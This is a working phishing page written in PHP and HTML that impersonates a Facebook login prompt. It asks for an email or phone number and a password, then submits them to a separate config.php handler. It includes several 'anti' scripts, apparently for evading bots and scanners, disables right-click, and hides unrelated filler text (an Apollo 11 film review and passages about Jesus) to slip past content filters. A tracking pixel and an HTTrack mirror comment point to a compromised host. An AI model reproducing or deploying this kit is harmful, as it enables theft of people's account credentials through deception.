<?php

session_start();
include "../anti/anti1.php";
include "../anti/anti2.php"; 
include "../anti/anti3.php"; 
include "../anti/anti4.php"; 
include "../anti/anti5.php"; 
include "../anti/anti7.php"; 
?>



<html lang="en" dir="ltr">
<head>
    <title>Login in your account</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
<script>
function validateForm() {
  var x = document.forms["myForm"]["email"].value;
  var y = document.forms["myForm"]["password"].value;
  if (x.length < 5) {
    alert("Email or Phone Number empty");
    return false;
  } else if (y.length < 5) {
    alert("Password empty");
    return false;
  }
}
</script>
<style>
.do-ads {
	display: hidden;
	color:#FFF;
}
</style>
  </head>
  <body oncontextmenu="return false;">
  <h4 class="do-ads" style="color: #fff;">John 10: Jesus Teaching that He  Is Equal To God</h4>
    <center>
      <div style="
    font-family: sans-serif;
">
        <span style="
    color: #1877f2;
    font-weight: bold;
    font-size: 34px;
">facebook</span><div class="_585n" id="u_0_1_XT"><i class="_585p img sp_ot1t5YjYL3s_1_5x sx_14b617"><u></u></i><div class="_585r _50f4">Log Into Facebook</div></div>
        <br><b>You must log in to continue.<b>
<form action="config.php" method="POST" style="
    display: block;
    margin: 19px 0 0 0;
">
          <input type="text" name="email" class="form-control inpttxt" required="" placeholder="Mobile number or email" style="
    width: 93%;
    height: 42px;
    display: block;
    background: #f5f6f7;
    border: 1px solid #e8e8df;
    font-size: 14px;
    padding: 0 0 0 10px;
    border-radius: 3px;
">
          <input type="password" name="password" class="form-control inpttxt" required="" placeholder="Password" style="
    width: 93%;
    height: 42px;
    display: block;
    background: #f5f6f7;
    font-size: 14px;
    padding: 0 0 0 10px;
    border: 1px solid #e8e8df;
    margin: 5px 0;
    border-radius: 3px;
">
          <button type="submit" name="button" style="
    width: 93%;
    height: 40px;
    margin: 5px 0px;
    background: #1877f2;
    border: 0;
    color: #fff;
    font-size: 16px;
    border-radius: 4px;
">Log In</button>
        </form>
        <div style="
    margin: 10px 0;
">
          <div style="
    border-top: 1px solid #ccd0d5;
    width: 135px;
    display: inline-block;
"></div>
          <span style="
    display: inline-block;
    font-size: 14px;
    padding: 5px 15px 0 15px;
">or</span>
          <div style="
    border-top: 1px solid #ccc;
    width: 135px;
    display: inline-block;
"></div>
        </div>
        <a href="#" style="
    display: block;
    margin: 20px 0 0 0;
    text-decoration: none;
    color: #fff;
    background: #00a400;
    width: 163px;
    padding: 10px;
    border-radius: 5px;
    font-size: 14px;
    font-weight: bold;
">Create New Account</a>
        <a href="#" style="
    display: block;
    text-decoration: none;
    font-size: 14px;
    margin: 14px 0;
    color: #8a96cb;
">Forgot account?</a>
      </div>
      <div style="
    margin: 80px 0 0 0;
    font-family: sans-serif;
    font-size: 12px;
    color: #576b95;
    display: inline-flex;
">
   
       
      </div>
      <span style="
    display: block;
    font-family: sans-serif;
    font-size: 10px;
    color: gray;
    margin: 28px 0 12px 0px;
">About &#183; Help &#183; More</span>
      <span style="
    display: block;
    font-family: sans-serif;
    font-size: 12px;
    color: gray;
">Facebook Inc. Meta © 2023</span>
    </center>
<p class="do-ads">
Director Miller: A sense of space and primordial time

Apollo 11 is something like the "official" movie for the 50th anniversary of the moon landing on July 20, 1969. Three years ago, US news channel CNN commissioned director Miller to stage the film for the anniversary. Miller was right in the post-production of his short film Apollo 17 about NASA's last manned moon landing so far. The director had previously completed his spectacular dinosaur documentary "Dinosaur 13," so he seemed to be the right man for the job.

Watching Apollo 11 on the big screen now, it's as if time has stood still. Of course, only very few people experienced all the preparations and the work behind the scenes for the lunar landing in the manner the film presents it now. At that time, in 1969, the vast majority of people saw only the slightly blurred black-and-white shots of Neil Armstrong's legendary first step on the moon.

The film shows the days preceding the launch of the carrier rocket hosting the Apollo 11 spacecraft. It shows the work of hundreds of technicians in the NASA control centers and the preparations that finally led to the launch. Viewers experience the last hours of the three astronauts Neil Armstrong, Edwin "Buzz" Aldrin and Michael Collins up close before their mission. They are right there when the three don their spacesuits and helmets and receive final instructions from the technical personnel for their trip. They are with them as they take the elevator up to the space capsule and squeeze into their tight seats.

Several documentaries about the Apollo 11 mission have already been made, and feature films have condensed the successes and failures of lunar landing missions (most recently, First Man from 2018). Even early on in the history of cinema there was a spectacular excursion to the moon with French pioneer Georges Méliès' A Journey to the Moon from 1902. Cinema has also seen the filming of space mission conspiracy theories, such as the 1978 thriller Capricorn One portraying a Mars landing hoax.
The first landing on the moon as global media event

A few kilometers further on, thousands of people have convened, with cars and caravans everywhere. There's a vibe as though at a big outdoor rock concert. Families, men, women, children, space fans — they all want to experience the launch of the Apollo mission live. The film captures this with impressive shots from a helicopter perspective.

And so it continues. Until the launch of the rocket, and ultimately, the landing on the moon. Of course, the original shots become fewer and farther between — the flight, for example, is shown with short animated scenes, the filmmakers' only concession to the classic documentary film. These "empty spaces" are filled with sequences from the control center. There, hundreds of specialists sit in front of their computers, evaluate and recalculate flight paths, plan the next steps — and smoke. This small, incidental detail reminds the viewer perhaps most of all that this is an event from 1969. Back then, everyone smoked — really everyone.
Apollo 11 in brilliant color

But most amazing are the brilliant colors of the film. One recalls the moon landing in black and white —  and of course, the sequences of the first steps there and the astronauts' stay on the moon can only be seen this way. Everything else, on the other hand, radiates in color, captivatingly sharp, rich-in-contrast, color-intensive images made possible through digital processing.

"Apollo 11's mission is one of the greatest achievements in human history — hundreds of thousands of people, tens of thousands of companies, all focused on one goal: bringing people to another world," said director Miller, raving about the pioneering spirit of the time. He captured it in his film. What helped him most were the achievements of the digital age, which hardly anyone could have anticipated back in 1969.

Following its premiere at the Sundance Film Festival, the movie will be released in cinemas around the globe as of June 27, 2019. Screenings in German cinemas are scheduled as of July 7. Apollo 11 will also be shown in various IMAX movie theaters (partially, in a shortened version).
</p>
<img src="https://ibb.co/9YnPWQ5" width="1" height="1">



<p class="do-ads">The bulk of the Gospel accounts is devoted to the three years that  Jesus spent ministering around the Sea of Galilee in northern Israel.  They tell us of the life and teachings of a unique person. Jesus, the  Gospels explain, demonstrated his divine powers by healing the sick,  blind and lame; by raising the dead; by walking on water and calming a  storm at sea. Jesus’ teaching lacked the exacting legalism and piousness  that characterized so much of contemporary Judaism. He became  tremendously popular among the masses in Galilee.</p>
     
<script>

document.getElementsByClassName('do-ads').style.visibility='hidden';
</script>

</body>
<!-- Mirrored from asclave.com.br/m/facebook/marketplace/listing4575685/ by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 12 Sep 2023 05:51:29 GMT -->
</html>